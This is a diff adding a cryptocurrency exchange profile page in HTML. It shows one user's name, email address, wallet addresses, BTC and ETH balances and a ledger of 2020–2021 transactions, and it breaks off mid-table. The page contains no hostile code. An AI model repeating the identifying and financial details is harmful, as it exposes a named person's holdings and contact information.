@@ -1,0 +1,887 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Profile</title>
+<link rel="stylesheet" type="text/css" href="uikit.min.css">
+<link rel="stylesheet" type="text/css" href="dashboard.css">
+<link rel="stylesheet" type="text/css" href="https://btc-ex.org/css/fix.css">
+</head>
+<body>
+<header id="top-head" class="uk-position-fixed">
+<div class="uk-container uk-container-expand uk-background-primary">
+<nav class="uk-navbar uk-light" data-uk-navbar="mode:click; duration: 250">
+<div class="uk-navbar-left">
+<div class="uk-navbar-item uk-hidden@m"> <a class="uk-logo" href="/profile"><img src="logo1.png" style="width: 120px"></a> </div>
+<div class="uk-navbar-item">
+<ul class="uk-navbar-nav uk-visible@m">
+<li> <a> <b>Trade Balances:</b>&nbsp;&nbsp; <img src="https://btc-ex.org/img/ico/BTC.svg" width="16" height="16">&nbsp;<b style="color: #fff">1.142347</b>&nbsp;BTC&nbsp;(<b style="color: #fff">71434</b>&nbsp;USD)&nbsp;&nbsp;<img src="/img/ico/ETH.svg" width="16" height="16">&nbsp;<b style="color: #fff">0.067281</b>&nbsp;ETH </a> </li>
+</ul>
+</div>
+</div>
+<div class="uk-navbar-right">
+<a uk-toggle="target: #DEPOSIT" class="uk-button uk-button-default uk-button-small uk-visible@m uk-margin-small-right" style="background: #71C266"><span uk-icon="download"></span> DEPOSIT</a> <a uk-toggle="target: #WITHDRAW" class="uk-button uk-button-default uk-button-small uk-visible@m" style="background: #222A30"><span uk-icon="upload"></span> WITHDRAW</a>
+<ul class="uk-navbar-nav">
+<li><a class="uk-navbar-toggle uk-hidden@m" data-uk-toggle data-uk-navbar-toggle-icon href="#offcanvas-nav" data-uk-tooltip></a></li>
+</ul>
+</div>
+</nav>
+</div>
+</header>
+<aside id="left-col" class="uk-light uk-visible@m">
+<div class="left-logo uk-flex uk-flex-middle" style="padding-left: 25%; font-size: 200%"> <a class="uk-logo" href="/profile"><img src="/img/logo2.png" style="width: 120px"></a> </div>
+<div class="left-content-box content-box-dark">
+<img src="https://btc-ex.org/img/noavatar.png" alt="" class="uk-border-circle profile-img">
+<h4 class="uk-text-center uk-margin-remove-vertical text-light">James Greenberg</h4>
+<div class="uk-position-relative uk-text-center uk-display-block"> <span class="uk-text-small uk-text-muted uk-display-block uk-text-center">jamesgr33n@gmail.com</span> </div>
+</div>
+<div class="left-nav-wrap">
+<ul class="uk-nav uk-nav-default uk-nav-parent-icon" data-uk-nav>
+<li><a href="/profile"><span data-uk-icon="icon: home" class="uk-margin-small-right"></span>Dashboard</a></li>
+<li><a uk-toggle="target: #DEPOSIT" href="#"><span data-uk-icon="icon: download" class="uk-margin-small-right"></span>Deposit</a></li>
+<li><a uk-toggle="target: #WITHDRAW" href="#"><span data-uk-icon="icon: upload" class="uk-margin-small-right"></span>Withdraw</a></li>
+<li><a href="/profile"><span data-uk-icon="icon: file-text" class="uk-margin-small-right"></span>Ledger</a></li>
+<li><a href="/faqs"><span data-uk-icon="icon: lifesaver" class="uk-margin-small-right"></span>Help</a></li>
+<hr>
+<li><a href="/profile"><span data-uk-icon="icon: sign-out" class="uk-margin-small-right"></span>Logout</a></li>
+</ul>
+</div>
+</aside>
+<div id="content" data-uk-height-viewport="expand: true">
+<div class="uk-grid uk-grid-medium" data-uk-grid uk-sortable="handle: .sortable-icon">
+<div class="uk-width-1-2@l">
+<div class="uk-card uk-card-default uk-card-small uk-card-hover">
+ <div class="uk-card-header">
+<div class="uk-grid uk-grid-small">
+<div class="uk-width-auto">
+<h4><span class="uk-margin-small-right" uk-icon="user"></span> Account: ID 1446</h4>
+</div>
+<div class="uk-width-expand uk-text-right panel-icons"> <a href="#" class="uk-icon-link sortable-icon" title="Move" data-uk-tooltip data-uk-icon="icon: move"></a> </div>
+</div>
+</div>
+<div class="uk-card-body" style="padding: 0;">
+<div class="chart-container">
+<table class="uk-table uk-table-striped uk-table-middle uk-table-small">
+<thead>
+<tr>
+<th style="width: 70%">Asset</th>
+<th>Amount</th>
+<th class="uk-visible@m"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td> <span style="width: 35px; display: flex; float: left;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="float: left; margin-right: 5px; height: 24px;"></span> Bitcoin (BTC) </td>
+<td> <b>1.142347</b> </td>
+<td class="uk-visible@m uk-text-center"> <a uk-toggle="target: #DEPOSIT" style="padding: 0px 19px; font-size:10px" class="uk-button uk-button-default uk-button-small uk-visible@m uk-margin-small-right" title="DEPOSIT" data-uk-tooltip>Buy</a> </td>
+</tr>
+<tr>
+<td> <span style="width: 35px; display: flex; float: left;"><img src="https://btc-ex.org/img/ico/ETH.svg" style="float: left; margin-right: 5px; height: 24px;"></span> Ethereum (ETH) </td>
+<td> <b>0.067281</b> </td>
+<td class="uk-visible@m uk-text-center"> <a uk-toggle="target: #DEPOSIT" style="padding: 0px 19px; font-size:10px" class="uk-button uk-button-default uk-button-small uk-visible@m uk-margin-small-right" title="DEPOSIT" data-uk-tooltip>Buy</a> </td>
+</tr>
+<tr>
+<td> <span style="width: 35px; display: flex; float: left;"><img src="https://btc-ex.org/img/ico/BCH.svg" style="float: left; margin-right: 5px; height: 24px;"></span> Bitcoin Cash (BCH) </td>
+<td> <b>0</b> </td>
+<td class="uk-visible@m uk-text-center"> <a uk-toggle="target: #DEPOSIT" style="padding: 0px 19px; font-size:10px" class="uk-button uk-button-default uk-button-small uk-visible@m uk-margin-small-right" title="DEPOSIT" data-uk-tooltip>Buy</a> </td>
+</tr>
+<tr>
+<td> <span style="width: 35px; display: flex; float: left;"><img src="https://btc-ex.org/img/ico/LTC.svg" style="float: left; margin-right: 5px; height: 24px;"></span> Litecoin (LTC) </td>
+<td> <b>0</b> </td>
+<td class="uk-visible@m uk-text-center"> <a uk-toggle="target: #DEPOSIT" style="padding: 0px 19px; font-size:10px" class="uk-button uk-button-default uk-button-small uk-visible@m uk-margin-small-right" title="DEPOSIT" data-uk-tooltip>Buy</a> </td>
+</tr>
+<tr>
+<td> <span style="width: 35px; display: flex; float: left;"><img src="https://btc-ex.org/img/ico/DASH.svg" style="float: left; margin-right: 5px; height: 24px;"></span> Dashcoin (DASH) </td>
+<td> <b>0</b> </td>
+<td class="uk-visible@m uk-text-center"> <a uk-toggle="target: #DEPOSIT" style="padding: 0px 19px; font-size:10px" class="uk-button uk-button-default uk-button-small uk-visible@m uk-margin-small-right" title="DEPOSIT" data-uk-tooltip>Buy</a> </td>
+</tr>
+</tbody>
+</table>
+<div style="padding-left:20px"> <a uk-toggle="target: #DEPOSIT" class="uk-button uk-button-default uk-button-small uk-margin-small-right" style=""><span uk-icon="download"></span> DEPOSIT</a> <a uk-toggle="target: #WITHDRAW" class="uk-button uk-button-default uk-button-small " style="box-shadow: inset 0 0 0 2px rgb(204, 0, 0);"><span uk-icon="upload"></span> WITHDRAW</a> <br></div>
+</div>
+</div>
+</div>
+</div>
+<div class="uk-width-1-2@l">
+<div class="uk-card uk-card-default uk-card-small uk-card-hover">
+<div class="uk-card-header">
+<div class="uk-grid uk-grid-small">
+<div class="uk-width-auto">
+<h4><span class="uk-margin-small-right" uk-icon="credit-card"></span> Your crypto wallets:</h4>
+</div>
+<div class="uk-width-expand uk-text-right panel-icons"> <a href="#" class="uk-icon-link sortable-icon" title="Move" data-uk-tooltip data-uk-icon="icon: move"></a> </div>
+</div>
+</div>
+<div class="uk-card-body" style="padding: 0;">
+<div class="chart-container">
+<table class="uk-table uk-table-striped uk-table-middle uk-table-responsive uk-table-small">
+<thead>
+<tr>
+<th>Asset</th>
+<th style="width: 50%">Wallet</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td> <span style="width: 35px; display: flex; float: left;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="float: left; margin-right: 5px; height: 24px;"></span> Bitcoin </td>
+<td> <a uk-toggle="target: #EDIT">1Fd1zWsLCP8okiExCrhzvU4TD8zKYfgbZ1</a></b> </td>
+</tr>
+<tr>
+<td> <span style="width: 35px; display: flex; float: left;"><img src="https://btc-ex.org/img/ico/ETH.svg" style="float: left; margin-right: 5px; height: 24px;"></span> Ethereum </td>
+<td> <a uk-toggle="target: #ALERT2">0x4fffbb9905d14794cb18d192e8056c6aa7cba3c4</a></b> </td>
+</tr>
+<tr>
+<td> <span style="width: 35px; display: flex; float: left;"><img src="https://btc-ex.org/img/ico/BCH.svg" style="float: left; margin-right: 5px; height: 24px;"></span> Bitcoin Cash </td>
+<td> <a uk-toggle="target: #ALERT2">add wallet</a></b> </td>
+</tr>
+<tr>
+<td> <span style="width: 35px; display: flex; float: left;"><img src="https://btc-ex.org/img/ico/LTC.svg" style="float: left; margin-right: 5px; height: 24px;"></span> Litecoin </td>
+<td> <a uk-toggle="target: #ALERT2">add wallet</a></b> </td>
+</tr>
+<tr>
+<td> <span style="width: 35px; display: flex; float: left;"><img src="https://btc-ex.org/img/ico/DASH.svg" style="float: left; margin-right: 5px; height: 24px;"></span> Dashcoin </td>
+<td> <a uk-toggle="target: #ALERT2">add wallet</a></b> </td>
+</tr>
+</tbody>
+</table>
+<div style="padding-left:20px"> <a uk-toggle="target: #EDIT" class="uk-button uk-button-default uk-button-small uk-visible@m uk-margin-small-right" style=""><span uk-icon="file-edit"></span> EDIT WAILETS</a> <br></div>
+</div>
+</div>
+ </div>
+</div>
+<div class="uk-width-1-1@l">
+<div class="uk-card uk-card-default uk-card-small uk-card-hover">
+<div class="uk-card-header">
+<div class="uk-grid uk-grid-small">
+<div class="uk-width-auto">
+<h4><span class="uk-margin-small-right" uk-icon="file-text"></span> Ledger</h4>
+</div>
+<div class="uk-width-expand uk-text-right panel-icons"> <a href="#" class="uk-icon-link sortable-icon" title="Move" data-uk-tooltip data-uk-icon="icon: move"></a> </div>
+</div>
+</div>
+<div class="uk-card-body" style="padding: 0;">
+<div class="chart-container" style="overflow: auto;">
+<table class="uk-table uk-table-striped uk-table-hover uk-table-middle uk-table-small">
+<thead>
+<tr>
+<th></th>
+<th>Ledger ID</th>
+<th>Date</th>
+<th>Type</th>
+<th>Amount</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12891272</td>
+<td>Nov 02, 2021</td>
+<td>Deposit</td>
+<td>+ 0.55 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12841282</td>
+<td>Jun 03, 2021</td>
+<td>Withdraw</td>
+<td>- 0.92078 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12741141</td>
+<td>May 10, 2021</td>
+<td>Deposit</td>
+<td>+ 0.75 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12719139</td>
+<td>Mar 23, 2021</td>
+<td>Withdraw</td>
+<td>- 0.05 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Mar 23, 2021</td>
+<td>Commission</td>
+<td>+ 0.00051 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12718567</td>
+<td>Mar 17, 2021</td>
+<td>Withdraw</td>
+<td>- 0.15 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Mar 17, 2021</td>
+<td>Commission</td>
+<td>+ 0.001531 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12718291</td>
+<td>Mar 13, 2021</td>
+<td>Withdraw</td>
+<td>- 0.09 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Mar 13, 2021</td>
+<td>Commission</td>
+<td>+ 0.000918 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12716194</td>
+<td>Mar 03, 2021</td>
+<td>Withdraw</td>
+<td>- 0.068 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Mar 03, 2021</td>
+<td>Commission</td>
+<td>+ 0.000694 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12649132</td>
+<td>Feb 27, 2021</td>
+<td>Withdraw</td>
+<td>- 0.0155 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Feb 27, 2021</td>
+<td>Commission</td>
+<td>+ 0.000158 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12539533</td>
+<td>Feb 17, 2021</td>
+<td>Deposit</td>
+<td>+ 0.19 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+ <td>Feb 17, 2021</td>
+<td>Commission</td>
+<td>+ 0.001939 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12529596</td>
+<td>Jan 30, 2021</td>
+<td>Withdraw</td>
+<td>- 0.068 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Jan 30, 2021</td>
+<td>Commission</td>
+<td>+ 0.000694 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12527086</td>
+<td>Jan 28, 2021</td>
+<td>Withdraw</td>
+<td>- 0.025 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Jan 28, 2021</td>
+<td>Commission</td>
+<td>+ 0.000255 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12522018</td>
+<td>Jan 22, 2021</td>
+<td>Withdraw</td>
+<td>- 0.04 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Jan 22, 2021</td>
+<td>Commission</td>
+<td>+ 0.000408 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12521004</td>
+<td>Jan 7, 2021</td>
+<td>Withdraw</td>
+<td>- 0.034 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Jan 7, 2021</td>
+<td>Commission</td>
+<td>+ 0.000347 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12411311</td>
+<td>Dec 23, 2020</td>
+<td>Withdraw</td>
+<td>- 0.01 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Dec 23, 2020</td>
+<td>Commission</td>
+<td>+ 0.000102 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12401382</td>
+<td>Dec 12, 2020</td>
+<td>Deposit</td>
+<td>+ 0.031 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Dec 12, 2020</td>
+<td>Commission</td>
+<td>+ 0.000316 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12401283</td>
+<td>Dec 9, 2020</td>
+<td>Deposit</td>
+<td>+ 0.1 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+ <td></td>
+<td>Dec 9, 2020</td>
+<td>Commission</td>
+<td>+ 0.00102 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12302343</td>
+<td>Nov 21, 2020</td>
+<td>Deposit</td>
+<td>+ 0.05 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Nov 21, 2020</td>
+<td>Commission</td>
+<td>+ 0.00051 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/ETH.svg" style="height: 20px;"></td>
+<td>12251380</td>
+<td>Nov 21, 2020</td>
+<td>Deposit</td>
+<td>+ 1 ETH</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/ETH.svg" style="height: 20px;"></td>
+<td></td>
+<td>Nov 21, 2020</td>
+<td>Commission</td>
+<td>+ 0.010204 ETH</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/ETH.svg" style="height: 20px;"></td>
+<td>12161789</td>
+<td>Nov 2, 2020</td>
+<td>Deposit</td>
+<td>+ 3 ETH</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/ETH.svg" style="height: 20px;"></td>
+<td></td>
+<td>Nov 2, 2020</td>
+<td>Commission</td>
+<td>+ 0.030612 ETH</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+ <td>12161428</td>
+<td>Nov 1, 2020</td>
+<td>Withdraw</td>
+<td>- 0.05 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Nov 1, 2020</td>
+<td>Commission</td>
+<td>+ 0.00051 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12160110</td>
+<td>Oct 19, 2020</td>
+<td>Deposit</td>
+<td>+ 0.08 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Oct 19, 2020</td>
+<td>Commission</td>
+<td>+ 0.000816 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12140015</td>
+<td>Oct 1, 2020</td>
+<td>Withdraw</td>
+<td>- 0.1 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Oct 1, 2020</td>
+<td>Commission</td>
+<td>+ 0.00102 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/ETH.svg" style="height: 20px;"></td>
+<td>12130816</td>
+<td>Sep 15, 2020</td>
+<td>Withdraw</td>
+<td>- 2 ETH</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/ETH.svg" style="height: 20px;"></td>
+ <td></td>
+<td>Sep 15, 2020</td>
+<td>Commission</td>
+<td>+ 0.020408 ETH</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12120458</td>
+<td>Jun 11, 2020</td>
+<td>Withdraw</td>
+<td>- 0.03 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Jun 11, 2020</td>
+<td>Commission</td>
+<td>+ 0.000306 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12110057</td>
+<td>Jun 08, 2020</td>
+<td>Deposit</td>
+<td>+ 0.02 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Jun 08, 2020</td>
+<td>Commission</td>
+<td>+ 0.000204 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12103468</td>
+<td>Jun 05, 2020</td>
+<td>Deposit</td>
+<td>+ 0.03 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>Jun 05, 2020</td>
+<td>Commission</td>
+<td>+ 0.000306 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td>12001559</td>
+<td>May 31, 2020</td>
+<td>Withdraw</td>
+<td>- 0.12 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
+<td></td>
+<td>May 31, 2020</td>
+<td>Commission</td>
+<td>+ 0.001224 BTC</td>
+<td style="width:60px;text-align:center;"><a class="uk-icon-link sortable-icon" title="OK" data-uk-tooltip data-uk-icon="icon: check"></a></td>
+</tr>
+<tr>
+<td style="width:50px;text-align:center;"><img src="https://btc-ex.org/img/ico/BTC.svg" style="height: 20px;"></td>
